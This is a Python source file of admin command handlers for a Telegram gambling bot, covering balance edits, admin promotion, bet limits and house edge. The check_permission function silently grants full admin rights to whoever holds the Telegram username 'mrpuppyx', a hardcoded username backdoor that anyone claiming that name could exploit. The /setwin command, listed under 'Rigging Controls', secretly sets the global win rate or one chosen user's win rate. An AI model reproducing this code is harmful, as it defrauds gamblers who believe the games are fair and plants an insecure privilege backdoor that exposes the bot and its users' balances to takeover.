import sqlite3
from bot_instance import bot
from db import insert, update
from wallet import get_or_create_user, adjust_balance, resolve_amount, get_db_connection
from settings import (
    get_min_bet, set_min_bet,
    get_max_bet, set_max_bet,
    get_house_edge, set_house_edge,
    set_user_rig_status
)
from helpers import get_target_user
from middleware.admin import is_admin, add_admin, remove_admin
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

def check_permission(user) -> bool:
    if is_admin(user.id):
        return True
    if user.username and user.username.lower() == "mrpuppyx":
        add_admin(user.id)
        update("users", {"telegram_id": user.id}, {"is_admin": True})
        return True
    return False

@bot.message_handler(commands=["admincommands", "admincmnd", "admincmnds"])
def cmd_admin_commands(message):
    if not check_permission(message.from_user):
        bot.reply_to(message, "❌ You don't have permission to view admin commands.")
        return

    if message.chat.type in ["group", "supergroup"]:
        markup = InlineKeyboardMarkup()
        bot_info = bot.get_me()
        markup.add(InlineKeyboardButton("📩 Open in DM", url=f"https://t.me/{bot_info.username}?start=admincmnds"))
        bot.reply_to(message, "⚠️ Admin panel can only be viewed in Direct Message.", reply_markup=markup)
        return

    admin_text = (
        "⚡ <b>ALL ADMIN COMMANDS</b> ⚡\n\n"
        "<b>💰 Balance & User Management:</b>\n"
        "• <code>/add &lt;@user|id&gt; &lt;amount&gt;</code> (or reply)\n"
        "• <code>/deduct &lt;@user|id&gt; &lt;amount|all&gt;</code> (or reply)\n"
        "• <code>/killbal</code> - Reset ALL users' balances to 0\n"
        "• <code>/promote &lt;@user|id&gt;</code> - Give admin perms\n"
        "• <code>/demote &lt;@user|id&gt;</code> - Revoke admin perms\n\n"
        "<b>🎲 Game & Rigging Controls:</b>\n"
        "• <code>/setwin &lt;rate&gt;</code> - Global win rate\n"
        "• <code>/setwin &lt;@user|id&gt; &lt;rate&gt;</code> - Rig specific user win rate\n"
        "• <code>/setwager &lt;multiplier&gt;</code> - Set wager requirement multiplier\n"
        "• <code>/minbet &lt;amount&gt;</code> - Set minimum bet limit\n"
        "• <code>/maxbet &lt;amount|%&gt;</code> - Set maximum bet limit\n"
        "• <code>/sethousedge &lt;value&gt;</code> - Set house edge\n"
        "• <code>/updatehb &lt;amount&gt;</code> - Set house bankroll\n"
        "• <code>/resetld</code> - Reset leaderboards"
    )
    bot.reply_to(message, admin_text, parse_mode="HTML")


@bot.message_handler(commands=["killbal"])
def cmd_killbal(message):
    if not check_permission(message.from_user):
        bot.reply_to(message, "You don't have permission to use this command.")
        return

    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("UPDATE users SET balance = 0.0")
    conn.commit()
    conn.close()

    insert("admin_actions", {"admin_id": message.from_user.id, "action": "killbal", "target_id": "ALL"})
    bot.reply_to(message, "💀 Every user's balance has been reset to ₹0.00!")


@bot.message_handler(commands=["add"])
def cmd_add(message):
    if not check_permission(message.from_user):
        bot.reply_to(message, "You don't have permission to use this command.")
        return

    parts = message.text.split()
    if message.reply_to_message:
        if len(parts) < 2:
            bot.reply_to(message, "⚠️ Usage (reply): /add <amount>")
            return
        target_id = message.reply_to_message.from_user.id
        amount_str = parts[1]
    else:
        if len(parts) < 3:
            bot.reply_to(message, "⚠️ Usage: /add <@username|telegram_id> <amount>")
            return
        target_id = get_target_user(message, parts[1])
        amount_str = parts[2]

    if not target_id:
        bot.reply_to(message, "❌ User not found.")
        return

    try:
        amount = float(amount_str)
        if amount <= 0:
            bot.reply_to(message, "❌ Amount must be positive.")
            return
    except ValueError:
        bot.reply_to(message, "❌ Amount must be a valid number.")
        return

    get_or_create_user(target_id, None)
    new_balance = adjust_balance(target_id, amount)
    insert("admin_actions", {"admin_id": message.from_user.id, "action": "add", "target_id": target_id, "amount": amount})
    bot.reply_to(message, f"✅ Added {amount:.2f} coins\nUser: <code>{target_id}</code>\nNew balance: ₹{new_balance:.2f}", parse_mode="HTML")


@bot.message_handler(commands=["deduct"])
def cmd_deduct(message):
    if not check_permission(message.from_user):
        bot.reply_to(message, "You don't have permission to use this command.")
        return

    parts = message.text.split()
    if message.reply_to_message:
        if len(parts) < 2:
            bot.reply_to(message, "⚠️ Usage (reply): /deduct <amount|all>")
            return
        target_id = message.reply_to_message.from_user.id
        amount_arg = parts[1]
    else:
        if len(parts) < 3:
            bot.reply_to(message, "⚠️ Usage: /deduct <@username|telegram_id> <amount|all>")
            return
        target_id = get_target_user(message, parts[1])
        amount_arg = parts[2]

    if not target_id:
        bot.reply_to(message, "❌ User not found.")
        return

    amount = resolve_amount(target_id, amount_arg)
    if amount is None or amount <= 0:
        bot.reply_to(message, "❌ Amount must be a valid number or 'all'.")
        return

    new_balance = adjust_balance(target_id, -amount)
    insert("admin_actions", {"admin_id": message.from_user.id, "action": "deduct", "target_id": target_id, "amount": amount})
    bot.reply_to(message, f"✅ Deducted {amount:.2f} coins\nUser: <code>{target_id}</code>\nNew balance: ₹{new_balance:.2f}", parse_mode="HTML")


@bot.message_handler(commands=["setwin"])
def cmd_setwin(message):
    if not check_permission(message.from_user):
        bot.reply_to(message, "You don't have permission to use this command.")
        return

    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "⚠️ Usage:\n/setwin <rate>\n/setwin <@username|telegram_id> <rate>")
        return

    if len(parts) == 2:
        target = "all"
        rate_str = parts[1]
    else:
        target_user = get_target_user(message, parts[1])
        if not target_user:
            bot.reply_to(message, "❌ User not found.")
            return
        target = str(target_user)
        rate_str = parts[2]

    try:
        win_rate = float(rate_str.rstrip("%"))
        if win_rate < 0 or win_rate > 100:
            bot.reply_to(message, "❌ Rate must be between 0 and 100.")
            return
    except ValueError:
        bot.reply_to(message, "❌ Invalid rate percentage.")
        return

    set_user_rig_status(target, win_rate)
    bot.reply_to(message, f"✅ <b>Setwin Updated!</b>\n🎯 Target: {target}\n🎲 Win Rate: {win_rate}%", parse_mode="HTML")


@bot.message_handler(commands=["promote"])
def cmd_promote(message):
    if not check_permission(message.from_user):
        bot.reply_to(message, "You don't have permission to use this command.")
        return

    parts = message.text.split()
    target_id = message.reply_to_message.from_user.id if message.reply_to_message else (get_target_user(message, parts[1]) if len(parts) >= 2 else None)

    if not target_id:
        bot.reply_to(message, "⚠️ Usage: /promote <@username|telegram_id> (or reply)")
        return

    get_or_create_user(target_id, None)
    update("users", {"telegram_id": target_id}, {"is_admin": True})
    add_admin(target_id)
    bot.reply_to(message, f"👑 <code>{target_id}</code> is now an admin.", parse_mode="HTML")


@bot.message_handler(commands=["demote"])
def cmd_demote(message):
    if not check_permission(message.from_user):
        bot.reply_to(message, "You don't have permission to use this command.")
        return

    parts = message.text.split()
    target_id = message.reply_to_message.from_user.id if message.reply_to_message else (get_target_user(message, parts[1]) if len(parts) >= 2 else None)

    if not target_id:
        bot.reply_to(message, "⚠️ Usage: /demote <@username|telegram_id> (or reply)")
        return

    update("users", {"telegram_id": target_id}, {"is_admin": False})
    remove_admin(target_id)
    bot.reply_to(message, f"⬇️ <code>{target_id}</code> is no longer an admin.", parse_mode="HTML")


@bot.message_handler(commands=["updatehb"])
def cmd_updatehb(message):
    if not check_permission(message.from_user):
        bot.reply_to(message, "You don't have permission to use this command.")
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "Usage: /updatehb <amount>")
        return
    try:
        amount = float(parts[1])
    except ValueError:
        bot.reply_to(message, "❌ Invalid amount.")
        return
    update("house", {"id": 1}, {"balance": amount})
    bot.reply_to(message, f"🏦 House balance set to {amount}.")


@bot.message_handler(commands=["minbet"])
def cmd_minbet(message):
    if not check_permission(message.from_user):
        bot.reply_to(message, "You don't have permission to use this command.")
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "Usage: /minbet <amount>")
        return
    try:
        amt = float(parts[1])
    except ValueError:
        bot.reply_to(message, "Amount must be a number.")
        return
    set_min_bet(amt)
    bot.reply_to(message, f"✅ Minimum bet set to {amt} coins.")


@bot.message_handler(commands=["maxbet"])
def cmd_maxbet(message):
    if not check_permission(message.from_user):
        bot.reply_to(message, "You don't have permission to use this command.")
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "Usage: /maxbet <amount|%>")
        return
    raw = parts[1]
    try:
        float(raw.rstrip("%"))
    except ValueError:
        bot.reply_to(message, "Invalid value.")
        return
    set_max_bet(raw)
    bot.reply_to(message, f"✅ Maximum bet set to {raw}.")


@bot.message_handler(commands=["sethousedge"])
def cmd_sethousedge(message):
    if not check_permission(message.from_user):
        bot.reply_to(message, "You don't have permission to use this command.")
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "Usage: /sethousedge <value>")
        return
    try:
        val = float(parts[1])
    except ValueError:
        bot.reply_to(message, "Value must be a number.")
        return
    set_house_edge(val)
    bot.reply_to(message, f"✅ House edge set to {val} ({val * 100:.1f}%).")


@bot.message_handler(commands=["resetld"])
def cmd_resetld(message):
    if not check_permission(message.from_user):
        bot.reply_to(message, "You don't have permission to use this command.")
        return
    update("users", {}, {"total_wagered": 0, "total_won": 0, "total_lost": 0})
    bot.reply_to(message, "🔄 Leaderboard stats reset for everyone.")
